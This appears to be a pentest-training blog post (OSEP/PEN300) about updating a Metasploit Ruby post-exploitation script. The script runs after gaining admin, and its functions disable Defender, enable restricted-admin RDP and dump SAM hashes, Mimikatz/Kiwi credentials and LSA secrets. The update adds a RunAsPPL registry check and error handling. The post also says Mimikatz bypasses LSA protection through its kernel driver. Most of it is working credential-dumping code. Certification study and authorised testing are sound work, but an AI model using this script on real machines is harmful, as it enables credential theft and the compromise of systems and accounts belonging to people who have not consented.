---
title: "Added RunAsPPL Check to Our PEN300 MSF Script"
date: 2021-12-01T10:21:33Z
categories: ["Programming", "Security"]
tags: ["OSEP", "PEN300", "Ruby", "Metasploit", "MIMIKATZ", "Hash_dump"]
---

While running some test this morning and stumbled on the following error:  

```sh
Could not execute auto: Rex::Post::Meterpreter::RequestError priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
```


This occurred while executing right after enabling restricted admin in our MSF script as show in the screenshot.  

![Error at priv_passwd_get_sam_hashes](/images/RunAsPPL/error.png)

There are two important points we need to discuss here, first when the error happened, it was not handle hence, the script stop running, this bad.  

The second point is what could go wrong right? the Meterpreter session is running as Administrator and Microsoft has been disable!  

Well, when we wrote the script we forgot to take in consideration `RunAsPPL` protection, this post won't be about describing what this feature is or how to bypass this feature, plus we don't need to, Mimikatz does it for us, which,  we will cover later on at the end of this post.   

Identifying the issue was trivial due to functions call used in the script, right after enabling resticted admin for RDP, the script dumps the creds found in the machine.  

```ruby
...
if is_system? or is_admin?
	start_admin_tasks
...
def start_admin_tasks
	disable_defender
	enable_restricted_admin_rdp
	dump_creds
	list_tokens
end
...
def dump_creds
	priv = Rex::Post::Meterpreter::Extensions::Priv::Priv.new(session)
	hashes = priv.sam_hashes
	print_status("\tDumping SAM Hashes")
	hashes.each do |hash|
	print_line("\t\t#{hash}")
	end
	print_status("\tAttempting to load KIWI")
	b = session.core.use('kiwi')

	if b
		print_good("\tKiwi loaded!")
		kiwi = Rex::Post::Meterpreter::Extensions::Kiwi::Kiwi.new(session)
		# creds_all
		credsall = kiwi.creds_all
		print_status("\tDumping creds_all")
		print_status("\t\t#{credsall}")
		# creds_wdigest
		credswdigest = kiwi.creds_wdigest
		print_status("\tDumping creds_wdigest")
		credswdigest[:wdigest].each do |wdigest|
			print_line("\t\t#{wdigest}")
		end
		# LSA Secrets
		secrets = kiwi.lsa_dump_secrets
		print_status("\tDumping LSA Secrets")
		print_line("\t\t#{secrets}")

	end
end
...
```

As said previously, dump_creds() function does not handle errors, this is can fixed trivially with begin block exception, which, we will do at the end. For now we will first creates function that checks if RunAsPPL is enabled on the system, to do so we can check the value of the registry `RunAsPPL` in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`.  

```ruby
def is_run_as_ppl_enabled?
	enabled = false
	begin
		key = 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa'
		root_key, base_key = session.sys.registry.splitkey(key)
		value = 'RunAsPPL'
		open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
		v = open_key.query_value(value)
		if v.data == 1
			enabled = true
		else
			enabled = false
		end
		open_key.close
	rescue => exception
		print_error("\tReading RunAsPPL registery key failed: #{exception}")
	end
	enabled
end
```

Straight forward process really, nothing out of the ordinary here, now below is the full code of the updated version of dum_creds() function:  

```ruby
def dump_creds
	begin
		if !is_run_as_ppl_enabled?
			priv = Rex::Post::Meterpreter::Extensions::Priv::Priv.new(session)
			hashes = priv.sam_hashes
			print_status("\tDumping SAM Hashes")
			hashes.each do |hash|
				print_line("\t\t#{hash}")
			end
		end

		print_status("\tAttempting to load KIWI")
		b = session.core.use('kiwi')
		if b
			print_good("\tKiwi loaded!")
			kiwi = Rex::Post::Meterpreter::Extensions::Kiwi::Kiwi.new(session)
			# creds_all
			credsall = kiwi.creds_all
			print_status("\tDumping creds_all")
			print_status("\t\t#{credsall}")
			# creds_wdigest
			credswdigest = kiwi.creds_wdigest
			print_status("\tDumping creds_wdigest")
			credswdigest[:wdigest].each do |wdigest|
				print_line("\t\t#{wdigest}")
			end

			# LSA Secrets
			secrets = kiwi.lsa_dump_secrets
			print_status("\tDumping LSA Secrets")
			print_line("\t\t#{secrets}")
		end

	rescue => exception
		print_error("\tDumpCreds failed: #{exception}")
	end
end
```

Running our tests again, no errors were raised! it is much less error prone, always check for exception and error in your code.  

![No errors](/images/RunAsPPL/good.png)

Earlier, I said that Mimikatz bypass the protection for us, I think I need to be more descriptive here for clarity. In the nutshell, the way Mimikatz bypass the feature is by loading its driver and then disable the feature from the kernel, now by simply loading Mimikatz it does it under the hound and the equivalent of hash_dump function in Mimikatz is lsa_dump_sam, which a function wrap to `lsadump::sam`.

References:
- https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Kiwi/Kiwi 
- https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Priv/Priv 
- https://itm4n.github.io/lsass-runasppl/
- https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection 
- https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Kiwi/Kiwi#lsa_dump_sam-instance_method